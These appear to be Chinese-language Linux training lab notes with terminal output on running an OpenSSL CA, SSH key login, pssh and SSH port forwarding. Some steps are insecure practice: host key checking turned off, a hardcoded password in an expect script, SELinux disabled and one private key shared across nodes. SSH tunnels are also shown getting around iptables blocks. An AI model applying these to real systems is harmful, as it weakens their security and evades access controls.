            stateOrProvinceName       = beijing
            organizationName          = magedu
            organizationalUnitName    = app
            commonName                = app.magedu.com
            emailAddress              = app@magedu.com
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            Netscape Comment: 
                OpenSSL Generated Certificate
            X509v3 Subject Key Identifier: 
                CC:C2:30:08:B1:2F:5E:F8:67:5B:2F:FB:50:83:0A:25:30:A5:78:85
            X509v3 Authority Key Identifier: 
                keyid:71:50:B6:D5:95:C6:06:79:10:C2:6A:49:BA:77:E3:8E:9C:C3:CD:E0

Certificate is to be certified until Feb  5 11:33:58 2021 GMT (100 days)
Sign the certificate? [y/n]:y


1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated

```

## 内容相同

```
[root@node1 CA]# diff certs/app.crt newcerts/01.pem 
[root@node1 CA]# 

```

```
[root@node1 CA]# cat index.txt
V	210205113358Z		01	unknown	/C=CN/ST=beijing/O=magedu/OU=app/CN=app.magedu.com/emailAddress=app@magedu.com
[root@node1 CA]# 
Ｖ表示证书有效
```

## 查看指定编号的证书状态

```
[root@node1 CA]# openssl ca -status 01
Using configuration from /etc/pki/tls/openssl.cnf
01=Valid (V)
[root@node1 CA]# 

```

## 在服务器上生成二个证书文件

```
[root@node1 data]# (umask 066;openssl genrsa -out aap2.key 1024)
Generating RSA private key, 1024 bit long modulus
.............++++++
................++++++
e is 65537 (0x10001)
[root@node1 data]# ll

```

## 城市不一样

```
[root@node1 data]# openssl req -new -key aap2.key -out aap2.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:henan
Locality Name (eg, city) [Default City]:zhengzhou
Organization Name (eg, company) [Default Company Ltd]:magedu
Organizational Unit Name (eg, section) []:ops
Common Name (eg, your name or your server's hostname) []:aap2.magedu.com
Email Address []:aap2@magedu.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
[root@node1 data]# openssl ca -in aap2.csr -out /etc/pki/CA/certs/aap2.crt -days 200
Using configuration from /etc/pki/tls/openssl.cnf
Check that the request matches the signature
Signature ok
The stateOrProvinceName field needed to be the same in the
CA certificate (beijing) and the request (henan)
[root@node1 data]# 

```

## 解决问题

```
[root@node1 data]# vim /etc/pki/tls/openssl.cnf 
stateOrProvinceName     = optional

[root@node1 data]# 
[root@node1 data]# 
[root@node1 data]# openssl ca -in aap2.csr -out /etc/pki/CA/certs/aap2.crt -days 200
Using configuration from /etc/pki/tls/openssl.cnf
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: 2 (0x2)
        Validity
            Not Before: Oct 28 12:31:48 2020 GMT
            Not After : May 16 12:31:48 2021 GMT
        Subject:
            countryName               = CN
            stateOrProvinceName       = henan
            organizationName          = magedu
            organizationalUnitName    = ops
            commonName                = aap2.magedu.com
            emailAddress              = aap2@magedu.com
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            Netscape Comment: 
                OpenSSL Generated Certificate
            X509v3 Subject Key Identifier: 
                51:DF:22:93:6E:13:FF:39:70:E9:7E:23:6B:0E:FA:E8:73:69:51:37
            X509v3 Authority Key Identifier: 
                keyid:71:50:B6:D5:95:C6:06:79:10:C2:6A:49:BA:77:E3:8E:9C:C3:CD:E0

Certificate is to be certified until May 16 12:31:48 2021 GMT (200 days)
Sign the certificate? [y/n]:y


1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated

```

```
[root@node1 CA]# tree /etc/pki/CA
/etc/pki/CA
├── cacert.pem
├── certs
│   ├── aap2.crt
│   └── app.crt
├── crl
├── index.txt
├── index.txt.attr
├── index.txt.attr.old
├── index.txt.old
├── newcerts
│   ├── 01.pem
│   └── 02.pem
├── private
│   └── cakey.pem
├── serial
└── serial.old

4 directories, 12 files
[root@node1 CA]# cat /etc/pki/CA/index.txt
V	210205113358Z		01	unknown	/C=CN/ST=beijing/O=magedu/OU=app/CN=app.magedu.com/emailAddress=app@magedu.com
V	210516123148Z		02	unknown	/C=CN/ST=henan/O=magedu/OU=ops/CN=aap2.magedu.com/emailAddress=aap2@magedu.com
[root@node1 CA]# 

```

## 一个证书请求生成多个证书文件

```
[root@node1 CA]# cat /etc/pki/CA/index.txt.attr
unique_subject = yes
[root@node1 CA]# sed -i 's/yes/no/g' /etc/pki/CA/index.txt.attr
[root@node1 CA]# cat /etc/pki/CA/index.txt.attr
unique_subject = no

[root@node1 data]# openssl ca -in aap2.csr -out /etc/pki/CA/certs/aap2_2.crt -days 200
Using configuration from /etc/pki/tls/openssl.cnf
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: 3 (0x3)
        Validity
            Not Before: Oct 28 12:36:28 2020 GMT
            Not After : May 16 12:36:28 2021 GMT
        Subject:
            countryName               = CN
            stateOrProvinceName       = henan
            organizationName          = magedu
            organizationalUnitName    = ops
            commonName                = aap2.magedu.com
            emailAddress              = aap2@magedu.com
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            Netscape Comment: 
                OpenSSL Generated Certificate
            X509v3 Subject Key Identifier: 
                51:DF:22:93:6E:13:FF:39:70:E9:7E:23:6B:0E:FA:E8:73:69:51:37
            X509v3 Authority Key Identifier: 
                keyid:71:50:B6:D5:95:C6:06:79:10:C2:6A:49:BA:77:E3:8E:9C:C3:CD:E0

Certificate is to be certified until May 16 12:36:28 2021 GMT (200 days)
Sign the certificate? [y/n]:y


1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated

```

## 吊销证书

```
[root@node1 CA]# echo 01 > /etc/pki/CA/crlnumber
[root@node1 CA]# openssl ca -gencrl -out /etc/pki/CA/crl.pem
Using configuration from /etc/pki/tls/openssl.cnf
[root@node1 CA]# cat /etc/pki/CA/crl.pem
-----BEGIN X509 CRL-----
MIIC/DCB5QIBATANBgkqhkiG9w0BAQsFADCBjDELMAkGA1UEBhMCQ04xEDAOBgNV
BAgMB2JlaWppbmcxEDAOBgNVBAcMB2JlaWppbmcxDzANBgNVBAoMBm1hZ2VkdTEP
MA0GA1UECwwGZGV2b3BzMRYwFAYDVQQDDA1jYS5tYWdlZHUuY29tMR8wHQYJKoZI
hvcNAQkBFhBhZG1pbkBtYWdlZHUuY29tFw0yMDEwMjgxMzA0MjFaFw0yMDExMjcx
MzA0MjFaMBQwEgIBAxcNMjAxMDI4MTIzODAzWqAOMAwwCgYDVR0UBAMCAQEwDQYJ
KoZIhvcNAQELBQADggIBAHeQnlqNK8BMnGA0TkZ+Q7fFB7FySK1T8cNK5StKNAMi
YsKljhZcQN7l80bYIVk/IZpqrbjCns+gsXUjqdWaTmmkINskv9Nm7ONoM2L2N7sa
fRxzcREATalsMmowQBn1OTO5mPamRZg8bqvDlqyivgRbOUxjYAFLK1cEhshNlAby
Gw25XrRIDnudYcKnSKqYlg+XGtZQqvmervBnvK1Pih14IVmARAOKQRrUeVKHzED3
A96PeYtXzRY6w0nYTELMoyIQlnZEFEQIX+OqaC/spryhhj/Mvo0ERKy1a1gyht/+
D7Pr6bpEri0mVdTmSP85uN3hlDTApa9hV98WL50s8ybe8CaOq82xC+kfDkvaZzOm
y5qQW4ovlMuZTh4e7ybxP4Fbytttm+KZWPlQoQP4W4Y1Q5T2DRp7jZio18b0aNsv
4FfhwVkF9Gl6PgIEejA2bXvbH8DlnM4xujfuXtIxxUVKw0QWR6fuKOpYnoYOmtSB
M5ghgp7b66trgUxcOvOSuNbTHZJI8Y9v+n/V9UAEWCmNAwng2n8kGpEU3JquUMGS
Ul+rBfyMyhHklTqMKagveDgKZ1CCcBF7W7KhhvbKt3Rm19POquzdJPi01gqBQ7Ho
gLPl8I1M/Pk8ihsDNFSAowbLI2vvsGE566xC4/7IpStp3/VxxT4oBT9Q0imqbpnu
-----END X509 CRL-----
[root@node1 CA]# openssl crl -in /etc/pki/CA/crl.pem -noout -text
Certificate Revocation List (CRL):
        Version 2 (0x1)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: /C=CN/ST=beijing/L=beijing/O=magedu/OU=devops/CN=ca.magedu.com/emailAddress=admin@magedu.com
        Last Update: Oct 28 13:04:21 2020 GMT
        Next Update: Nov 27 13:04:21 2020 GMT
        CRL extensions:
            X509v3 CRL Number: 
                1

```

可以把crl.pem 传到window中后缀crl查看吊销信息

```
[root@node1 certs]# openssl x509 -in app.crt -noout -serial -subject
serial=01
subject= /C=CN/ST=beijing/O=magedu/OU=devops/CN=app.magedu.com/emailAddress=app@magedu.com
[root@node1 certs]# 

[root@node1 data]# openssl ca -revoke /etc/pki/CA/newcerts/01.pem
Using configuration from /etc/pki/tls/openssl.cnf
Revoking Certificate 01.

```



## 查看吊销信息

```
[root@node1 CA]# cat /etc/pki/CA/index.txt
V	210205113358Z		01	unknown	/C=CN/ST=beijing/O=magedu/OU=app/CN=app.magedu.com/emailAddress=app@magedu.com
V	210516123148Z		02	unknown	/C=CN/ST=henan/O=magedu/OU=ops/CN=aap2.magedu.com/emailAddress=aap2@magedu.com
R	210516123628Z	201028123803Z	03	unknown	/C=CN/ST=henan/O=magedu/OU=ops/CN=aap2.magedu.com/emailAddress=aap2@magedu.com
[root@node1 CA]# 

```

## SSH

```
[root@node1 CA]# rpm -ql openssh-clients
/etc/ssh/ssh_config
/usr/bin/scp
/usr/bin/sftp
/usr/bin/slogin
/usr/bin/ssh
/usr/bin/ssh-add
/usr/bin/ssh-agent
/usr/bin/ssh-copy-id
/usr/bin/ssh-keyscan

```

```
[root@node1 CA]# rpm -ql openssh-server 
/etc/pam.d/sshd
/etc/ssh/sshd_config
/etc/sysconfig/sshd
/usr/lib/systemd/system/sshd-keygen.service
/usr/lib/systemd/system/sshd.service
/usr/lib/systemd/system/sshd.socket
/usr/lib/systemd/system/sshd@.service
/usr/lib64/fipscheck/sshd.hmac
/usr/libexec/openssh/sftp-server
/usr/sbin/sshd
/usr/sbin/sshd-keygen

```

```
[root@node1 CA]# rpm -ql openssh
/etc/ssh
/etc/ssh/moduli
/usr/bin/ssh-keygen
/usr/libexec/openssh
/usr/libexec/openssh/ctr-cavstest
/usr/libexec/openssh/ssh-keysign
/usr/share/doc/openssh-7.4p1
/usr/share/doc/openssh-7.4p1/CREDITS
/usr/share/doc/openssh-7.4p1/ChangeLog
/usr/share/doc/openssh-7.4p1/INSTALL
/usr/share/doc/openssh-7.4p1/OVERVIEW

```

```
[root@node1 CA]# systemctl is-enabled sshd
enabled
[root@node1 CA]# cat /usr/lib/systemd/system/sshd
sshd-keygen.service  sshd.service         sshd@.service        sshd.socket          
[root@node1 CA]# cat /usr/lib/systemd/system/sshd.service 
[Unit]
Description=OpenSSH server daemon
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target sshd-keygen.service
Wants=sshd-keygen.service

[Service]
Type=notify
EnvironmentFile=/etc/sysconfig/sshd
ExecStart=/usr/sbin/sshd -D $OPTIONS
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target

```

## 修改配置文件的值

```
[root@node1 ~]# vim /etc/ssh/ssh_config 

StrictHostKeyChecking no    连接时不检查主机的指纹信息

```

## 执行一条命令

```
[root@node1 ~]# ssh 192.168.0.104 ls /data/
root@192.168.0.104's password: 
app
fstab
fstab.gpg
magedu.pubkey
[root@node1 ~]# 

```

## 修改端口号

```
[root@node1 ~]# vim /etc/ssh/sshd_config 
Port 22222
[root@node2 ~]# ssh 192.168.0.103 -p 22222
root@192.168.0.103's password: 
Last login: Thu Oct 29 08:45:08 2020 from 192.168.0.104
[root@node1 ~]# 

```

## 使用指定的ip连接对方

```
[root@node2 ~]# ssh 192.168.0.103 -p 22222 -b 192.168.0.192
root@192.168.0.103's password: 
Last login: Thu Oct 29 09:04:13 2020 from 192.168.0.101
[root@node1 ~]# ss -nt
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
ESTAB       0      0                                192.168.0.103:22222                                        192.168.0.192:35725              
ESTAB       0      0                                192.168.0.103:22222                                        192.168.0.101:52959              
[root@node1 ~]# 

```

## -v：调试模式

```
logout
debug1: channel 0: free: client-session, nchannels 1
Connection to 192.168.0.103 closed.
Transferred: sent 2708, received 3088 bytes, in 8.2 seconds
Bytes per second: sent 330.4, received 376.8
debug1: Exit status 0
[root@node2 ~]# ssh 192.168.0.103 -p 22222 -b 192.168.0.192 -v

```

## -X

```
[root@node2 ~]# ssh -X 192.168.0.103
root@192.168.0.103's password: 
Last login: Thu Oct 29 09:13:58 2020 from 192.168.0.104
[root@node1 ~]# xclock

```

## -t

```
[root@node4 ~]# iptables -A INPUT -s 192.168.0.103 -j REJECT
[root@node4 ~]# iptables -A INPUT -s 192.168.0.104 -j REJECT
[root@node4 ~]# 


[root@node1 ~]# ssh 192.168.0.109
ssh: connect to host 192.168.0.109 port 22: Connection refused
[root@node1 ~]# ssh -t 192.168.0.104 ssh -t 192.168.0.104 ssh -t 192.168.0.108 ssh 192.168.0.109
root@192.168.0.104's password: 
Warning: Permanently added '192.168.0.104' (ECDSA) to the list of known hosts.
root@192.168.0.104's password: 
Warning: Permanently added '192.168.0.108' (ECDSA) to the list of known hosts.
root@192.168.0.108's password: 
The authenticity of host '192.168.0.109 (192.168.0.109)' can't be established.
ECDSA key fingerprint is SHA256:B8psZxKS4BKKtdZDDCIa8CRonllD5CJieVSkiN6royw.
ECDSA key fingerprint is MD5:8e:fd:af:4a:7f:be:c4:21:17:44:42:00:47:14:1c:6d.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.109' (ECDSA) to the list of known hosts.
root@192.168.0.109's password: 
Last login: Wed Oct 28 21:45:10 2020 from 192.168.0.101
[root@node4 ~]# 

```

## 基于密钥的登录方式

```
[root@node1 ~]# ssh 192.168.0.104
The authenticity of host '192.168.0.104 (192.168.0.104)' can't be established.
ECDSA key fingerprint is SHA256:zpZvV9s9dFXUlE86N8SSqruRXqPu5cARuNtEX7v2dg8.
ECDSA key fingerprint is MD5:44:6b:2d:c0:f2:d8:a1:d1:48:30:34:5a:2b:79:f1:e1.
Are you sure you want to continue connecting (yes/no)? 

```

```
[root@node3 ~]# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:o/sqp75gjqq3w88XK536As24r0WSq6LaCCO+Aks3Gbw root@node3
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|                 |
|  .              |
|   +             |
|  o+=   S        |
|..oEo .. .       |
|*o=oo..+         |
|BO=++ *.         |
|/+*BO@+o.        |
+----[SHA256]-----+
[root@node3 ~]# 
[root@node3 ~]# 
[root@node3 ~]# ssh-copy-id -i /root/.ssh/
id_rsa       id_rsa.pub   known_hosts  
[root@node3 ~]# ssh-copy-id -i /root/.ssh/id_rsa.pub 192.168.0.109
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/root/.ssh/id_rsa.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
root@192.168.0.109's password: 

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh '192.168.0.109'"
and check to make sure that only the key(s) you wanted were added.

[root@node3 ~]# ssh 192.168.0.109
Last login: Thu Oct 29 09:49:14 2020 from 192.168.0.101
[root@node4 ~]# 

```

## 给密钥添加密码

```
[root@node1 ~]# ssh-keygen -p
Enter file in which the key is (/root/.ssh/id_rsa): 
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# ssh 192.168.0.104
Enter passphrase for key '/root/.ssh/id_rsa': 
Last login: Fri Oct 30 08:27:13 2020 from 192.168.0.108

```

## 启动代理

```
[root@node1 ~]# ssh-agent bash
[root@node1 ~]# ssh-add
Enter passphrase for /root/.ssh/id_rsa: 
Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)
[root@node1 ~]# ssh 192.168.0.104
Last login: Fri Oct 30 08:32:24 2020 from 192.168.0.103
[root@node2 ~]# 

```

## 使用脚本设置ssh验证

```
[root@node1 ~]# cat sshkey.sh 
#!/bin/bash
#
PASS=shaoxh
ssh-keygen -t rsa -P "" -f /root/.ssh/id_rsa &> /dev/null && echo "ssh key is created"
rpm -q expect &> /dev/null || yum -y install expect &> /dev/null
while read IP;do
expect <<EOF
set timeout 20
spawn ssh-copy-id -i /root/.ssh/id_rsa.pub root@$IP
expect {
    "yes/no" {send "yes\n";exp_continue}
    "password" {send "$PASS\n"}
}
expect eof
EOF
echo $IP is ready
done < hosts.txt
[root@node1 ~]# cat hosts.txt 
192.168.0.104
192.168.0.108
[root@node1 ~]# 

```

rsync 实现增量传输

```
[root@node1 data]# rsync -av f* 192.168.0.109:/data/
root@192.168.0.109's password: 
sending incremental file list
f1
f2
f3

sent 158 bytes  received 69 bytes  90.80 bytes/sec
total size is 0  speedup is 0.00

[root@node1 data]# echo 01 >> f3
[root@node1 data]# rsync -av f* 192.168.0.109:/data/
root@192.168.0.109's password: 
sending incremental file list
f3

sent 91 bytes  received 31 bytes  48.80 bytes/sec
total size is 3  speedup is 0.02

```

## scp 命令

## sftp命令

## pssh 命令

```
[root@node1 ~]# rpm -qi pssh
Name        : pssh
Version     : 2.3.1
Release     : 5.el7
Architecture: noarch
Install Date: Fri 30 Oct 2020 01:01:16 PM CST
Group       : Applications/Productivity
Size        : 117882

```

## 互相免密钥

```

ssh-keygen -t rsa  
cat .ssh/id_rsa.pub > .ssh/authorized_keys
 chmod go= .ssh/authorized_keys 
把私钥复制到其他的节点上去
scp -p .ssh/* 192.168.111.128:/root/.ssh
验证

ssh 192.168.111.128 'ifconfig'

```



## pssh连接远程主机

```
[root@node1 ~]# pssh -H 192.168.0.105 -A -i hostname
Warning: do not enter your password if anyone else has superuser
privileges or access to your account.
Password: 
[1] 13:18:38 [SUCCESS] 192.168.0.105
node2
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# vim hosts.txt
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# pssh -h hosts.txt -A -i hostname
Warning: do not enter your password if anyone else has superuser
privileges or access to your account.
Password: 
[1] 13:19:25 [SUCCESS] 192.168.0.110
localhost.localdomain
[2] 13:19:25 [SUCCESS] 192.168.0.105
node2
[3] 13:19:25 [SUCCESS] 192.168.0.111
localhost.localdomain
[root@node1 ~]# pssh -H 192.168.0.105 192.168.0.110 192.168.0.111 -A -i hostname
[1] 13:19:41 [FAILURE] 192.168.0.105 Exited with error code 127
[root@node1 ~]# pssh -H "192.168.0.105 192.168.0.110 192.168.0.111" -A -i hostname
Warning: do not enter your password if anyone else has superuser
privileges or access to your account.
Password: 
[1] 13:20:01 [SUCCESS] 192.168.0.110
localhost.localdomain
[2] 13:20:01 [SUCCESS] 192.168.0.111
localhost.localdomain
[3] 13:20:01 [SUCCESS] 192.168.0.105
node2
[root@node1 ~]# 

```

## 免密钥后可以使用密钥

```
[root@node1 ~]# pssh -H "192.168.0.105 192.168.0.110 192.168.0.111"  -i hostname
[1] 13:21:11 [SUCCESS] 192.168.0.110
localhost.localdomain
[2] 13:21:11 [SUCCESS] 192.168.0.111
localhost.localdomain
[3] 13:21:11 [SUCCESS] 192.168.0.105
node2

```

## pssh修改selinux 状态

```
[root@node1 ~]# pssh -h hosts.txt -i "sed -i '/^SELINUX/s/enforcing/disabled/g' /etc/selinux/config"
[1] 13:24:24 [SUCCESS] 192.168.0.110
[2] 13:24:24 [SUCCESS] 192.168.0.105
[3] 13:24:24 [SUCCESS] 192.168.0.111
[root@node1 ~]# pssh -h hosts.txt -i "reboot"

```



## 复制本地文件到远程

```
[root@node1 ~]# pscp.pssh -h hosts.txt /root/hosts.txt /tmp/
[1] 13:33:43 [SUCCESS] 192.168.0.105
[2] 13:33:43 [SUCCESS] 192.168.0.111
[3] 13:33:43 [SUCCESS] 192.168.0.110
[root@node1 ~]# 

```

## 下载服务器到本地

```
[root@node1 ~]# pslurp -h hosts.txt -L /data /etc/passwd userpasswd
[1] 13:39:36 [SUCCESS] 192.168.0.110
[2] 13:39:36 [SUCCESS] 192.168.0.105
[3] 13:39:36 [SUCCESS] 192.168.0.111

```

## ssh端口转发

```
[root@node3 ~]# iptables -A INPUT -s 192.168.0.107 -j REJECT
[root@node3 ~]# yum -y install telnet-server
[root@node3 ~]# systemctl start telnet.socket

```

```
[root@node1 data]# ssh 192.168.0.110
Last login: Fri Oct 30 03:43:33 2020 from 192.168.0.107
```

## 建立桥梁

```
[root@node1 ~]# ssh -L 9527:192.168.0.110:23 192.168.0.105 -fN
[root@node1 ~]# ss -t
State       Recv-Q Send-Q                         Local Address:Port                                          Peer Address:Port                
ESTAB       0      0                              192.168.0.107:40032                                        192.168.0.105:ssh                  
ESTAB       0      52                             192.168.0.107:ssh                                    
[root@node1 ~]# lsof -i :9527
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     47485 root    4u  IPv6 100256      0t0  TCP localhost:9527 (LISTEN)
ssh     47485 root    5u  IPv4 100257      0t0  TCP localhost:9527 (LISTEN)
[root@node1 ~]# 

```

```
[root@node1 ~]# telnet 127.0.0.1 9527
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Kernel 3.10.0-693.el7.x86_64 on an x86_64
node3 login: shaoxh
Password: 
[shaoxh@node3 ~]$ 
[shaoxh@node3 ~]$ 

```

## 发送邮件

```
[root@node1 ~]# mail -s test shaoxh
hello,shao
.
EOT
[root@node1 ~]# su - shaoxh
[shaoxh@node1 ~]$ mail
Heirloom Mail version 12.5 7/5/10.  Type ? for help.
"/var/spool/mail/shaoxh": 1 message 1 new
>N  1 root                  Fri Oct 30 16:45  18/587   "test"
& 1
Message  1:
From root@node1.localdomain  Fri Oct 30 16:45:21 2020
Return-Path: <root@node1.localdomain>
X-Original-To: shaoxh
Delivered-To: shaoxh@node1.localdomain
Date: Fri, 30 Oct 2020 16:45:21 +0800
To: shaoxh@node1.localdomain
Subject: test
User-Agent: Heirloom mailx 12.5 7/5/10
Content-Type: text/plain; charset=us-ascii
From: root@node1.localdomain (root)
Status: R

hello,shao

& 

```

## 实现postfix的转发

```
[root@node3 ~]# vim /etc/postfix/main.cf
inet_interfaces = all

[root@node3 ~]# 
[root@node3 ~]# 
[root@node3 ~]# systemctl restart postfix
[root@node3 ~]# ss -tnl 
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
LISTEN      0      128                                          *:22                                                       *:*                  
LISTEN      0      100                                          *:25                                                       *:*                  
LISTEN      0      128                                         :::22                                                      :::*                  
LISTEN      0      128                                         :::23                                                      :::*                  
LISTEN      0      100                                         :::25                                                      :::*                  
[root@node3 ~]# 

```

## 测试可以远程连接

```
[root@node2 tmp]# telnet 192.168.0.110 25
Trying 192.168.0.110...
Connected to 192.168.0.110.
Escape character is '^]'.
220 node3.localdomain ESMTP Postfix

```

## 杀死刚才的桥梁

```
[root@node1 ~]# ps -axu|grep ssh
root       1235  0.0  0.2 105996  4076 ?        Ss   12:22   0:00 /usr/sbin/sshd -D
root      13683  0.0  0.2 147788  5228 ?        Ss   12:57   0:00 sshd: root@pts/0
root      47485  0.0  0.0 180392  1372 ?        Ss   16:10   0:00 ssh -L 9527:192.168.0.110:23 192.168.0.105 -fN
root      48028  0.0  0.0 112664   972 pts/0    S+   16:54   0:00 grep --color=auto ssh
[root@node1 ~]# killall ssh
[root@node1 ~]# ps -axu|grep ssh
root       1235  0.0  0.2 105996  4076 ?        Ss   12:22   0:00 /usr/sbin/sshd -D
root      13683  0.0  0.2 147788  5228 ?        Ss   12:57   0:00 sshd: root@pts/0
root      48031  0.0  0.0 112664   972 pts/0    S+   16:54   0:00 grep --color=auto ssh
[root@node1 ~]# 

```

## 创建smtp的桥梁

```
[root@node1 ~]# ssh -L 9527:192.168.0.110:25 192.168.0.105 -fN
[root@node1 ~]# ss -tn
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
ESTAB       0      0                                192.168.0.107:40074                                        192.168.0.105:22                 
ESTAB       0      52                               192.168.0.107:22                                           192.168.0.101:62856              
[root@node1 ~]# 

```

## 发送邮件测试

```
[root@node1 ~]# telnet 127.0.0.1 9527
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 node3.localdomain ESMTP Postfix
helo a.com
250 node3.localdomain
mail from:magedu@magedu.com
250 2.1.0 Ok
rcpt to:root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: test2
how are you
.
250 2.0.0 Ok: queued as 49ABC1001A57
quit
221 2.0.0 Bye
Connection closed by foreign host.
[root@node1 ~]# 

```

## 查看内容信息

```
[root@node3 ~]# mail
mail           mailq          mailq.postfix  mailx          
[root@node3 ~]# mail
Heirloom Mail version 12.5 7/5/10.  Type ? for help.
"/var/spool/mail/root": 1 message 1 new
>N  1 magedu@magedu.com     Fri Oct 30 05:03  11/324   "test2"
& 1
Message  1:
From magedu@magedu.com  Fri Oct 30 05:03:34 2020
Return-Path: <magedu@magedu.com>
X-Original-To: root
Delivered-To: root@node3.localdomain
subject: test2
Status: R

how are you

& 

```

## 创建httpd的桥梁

```
kill -9  
root@node1 ~]# ssh -L 9527:192.168.0.110:80 192.168.0.105 -fN

```

## 请求的内容

```
[root@node1 ~]# telnet 127.0.0.1 9527
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
GET / HTTP/1.1
host: 1.1.1.1

HTTP/1.1 200 OK
Date: Fri, 30 Oct 2020 09:17:22 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Fri, 30 Oct 2020 09:07:39 GMT
ETag: "7-5b2dfba753b3a"
Accept-Ranges: bytes
Content-Length: 7
Content-Type: text/html; charset=UTF-8

shaoxh

Connection closed by foreign host.
[root@node1 ~]# 

```

## 远程端口转发

在中间主机上操作

```
[root@node2 ~]# ssh -R 9527:192.168.0.110:80 192.168.0.107 -fN
[root@node2 ~]# ss -tn
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
ESTAB       0      0                                192.168.0.105:55168                                        192.168.0.107:22                 
ESTAB       0      52                               192.168.0.105:22                                           192.168.0.101:63188              
[root@node2 ~]# 

```

## 测试是否能访问

```
[root@node1 ~]# telnet 127.0.0.1 9527
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
GET / HTTP/1.1
host: 1.1.1.1

HTTP/1.1 200 OK
Date: Fri, 30 Oct 2020 10:11:42 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Fri, 30 Oct 2020 09:07:39 GMT
ETag: "7-5b2dfba753b3a"
Accept-Ranges: bytes
Content-Length: 7
Content-Type: text/html; charset=UTF-8

shaoxh

Connection closed by foreign host.
[root@node1 ~]# 

```

## 配置代理服务器上网

```
[root@node3 ~]# echo www.google.com > /var/www/html/index.html 
[root@node3 ~]# curl localhost
www.google.com
[root@node3 ~]# iptables -A INPUT -s 192.168.0.107 -j REJECT
[root@node3 ~]# 

```

```
[root@node1 ~]# ssh -D 9527 192.168.0.105 -fN
[root@node1 ~]# ss -nt
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
ESTAB       0      52                               192.168.0.107:22                                           192.168.0.101:62856              
ESTAB       0      0                                192.168.0.107:40098                                        192.168.0.105:22                 
[root@node1 ~]# ss -tnl
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
LISTEN      0      128                                          *:111                                                      *:*                  
LISTEN      0      5                                192.168.122.1:53                                                       *:*                  
LISTEN      0      128                                          *:22                                                       *:*                  
LISTEN      0      128                                  127.0.0.1:9527                                                     *:*                  
LISTEN      0      128                                  127.0.0.1:631                                                      *:*                  
LISTEN      0      100                                  127.0.0.1:25                                                       *:*                  
LISTEN      0      128                                  127.0.0.1:6010                                                     *:*                  
LISTEN      0      128                                         :::111                                                     :::*                  
LISTEN      0      128                                         :::22                                                      :::*                  
LISTEN      0      128                                        ::1:9527                                                    :::*                  
LISTEN      0      128                                        ::1:631                                                     :::*                  
LISTEN      0      100                                        ::1:25                                                      :::*                  
LISTEN      0      128                                        ::1:6010                                                    :::*                  
[root@node1 ~]# 

```

## 打开浏览器配置代理服务器

![image-20201030193945029](C:\Users\localhost\AppData\Roaming\Typora\typora-user-images\image-20201030193945029.png)

![image-20201030194126796](C:\Users\localhost\AppData\Roaming\Typora\typora-user-images\image-20201030194126796.png)

## 命令行访问

```
[root@node1 ~]# curl --socks5 127.0.0.1:9527 http://192.168.0.110
www.google.com
[root@node1 ~]# 

```

## 全网连接9527，

```
[root@node1 ~]# killall ssh
[root@node1 ~]# ssh -gD 9527 192.168.0.105 -fN
[root@node1 ~]# ss -tnl 
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
LISTEN      0      128                                          *:111                                                      *:*                  
LISTEN      0      5                                192.168.122.1:53                                                       *:*                  
LISTEN      0      128                                          *:22                                                       *:*                  
LISTEN      0      128                                          *:9527                                                     *:*                  
LISTEN      0      128                                  127.0.0.1:631                                                      *:*                  
LISTEN      0      100                                  127.0.0.1:25                                                       *:*                  
LISTEN      0      128                                  127.0.0.1:6010                                                     *:*                  
LISTEN      0      128                                         :::111                                                     :::*                  
LISTEN      0      128                                         :::22                                                      :::*                  
